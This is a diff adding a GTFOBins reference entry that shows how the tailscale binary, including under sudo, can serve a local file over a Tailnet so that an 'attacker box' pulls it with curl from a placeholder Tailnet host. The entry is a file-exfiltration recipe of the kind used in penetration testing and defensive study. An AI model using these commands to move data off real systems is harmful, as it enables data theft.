@@ -1,0 +1,18 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/tailscale -->
+---
+functions:
+  upload:
+  - code: |-
+      tailscale serve --http=12345 /path/to/input-file
+    comment: |-
+      The URL is reachable by any host of the same Tailnet.
+    contexts:
+      sudo:
+    receiver:
+      code: |-
+        curl http://<hostname>.<tailnet>.ts.net:12345/ -o /path/to/output-file
+      comment: |-
+        An HTTP client can be used on the attacker box to receive the data.
+
+        The actual URL is returned by the command.
+...
